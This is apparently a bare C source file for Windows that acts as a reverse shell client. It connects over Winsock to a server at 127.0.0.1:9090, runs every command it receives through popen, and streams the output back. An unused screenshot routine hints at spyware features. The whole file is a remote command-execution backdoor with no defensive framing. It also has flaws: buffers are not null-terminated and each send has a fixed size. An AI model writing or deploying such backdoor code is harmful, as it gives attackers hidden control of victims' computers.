#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

void screenShot();
int main() {
	int status, socketfd, connectfd, sendfd, recvfd;
	char buffer[100], command[100], data[10000];
	FILE *fp;
	
	// wsa informatin
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	// defining structure for client
	struct sockaddr_in addressClient;
	memset(&addressClient, '\0', sizeof(addressClient));
	addressClient.sin_family = AF_INET;
	addressClient.sin_addr.s_addr = inet_addr("127.0.0.1");
	addressClient.sin_port = htons(9090);

	socketfd = socket(AF_INET, SOCK_STREAM, 0);
	if(socketfd < 0) {
		printf("ERROR: creating a socket\n");
	} else {
		printf("Socket is created!\n");
		connectfd = connect(socketfd, (struct sockaddr*)&addressClient, sizeof(addressClient));
		if(connectfd < 0) {
			printf("You are not connected with the server\n");
		} else {
			printf("You are connected\n");
			memset(&buffer, '\0', sizeof(buffer));
			memset(&command, '\0', sizeof(command));
			while(1) {
				recvfd = recv(socketfd, buffer, 100, 0);
				if(recvfd < 0) {
					printf("There is an error while receiving a command\n");
				}
				printf("Received: %s and its size: %d\n", buffer, strlen(buffer));
				
				// special commands
				fp = popen(buffer, "r");

				if(fp != NULL)
					while(fgets(data, 10000, fp) != NULL)
						send(socketfd, data, 10000, 0);
				status = pclose(fp);
				if(status == -1) {
					printf("Error while closing pipe\n");
				}
				send(socketfd, "\0", 10, 0);
				printf("NULL TERMINATOR SENT!\n");
			}
		}
	}
}

void screenShot() {
	keybd_event(VK_SNAPSHOT, 0, 0, 0);
	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
}
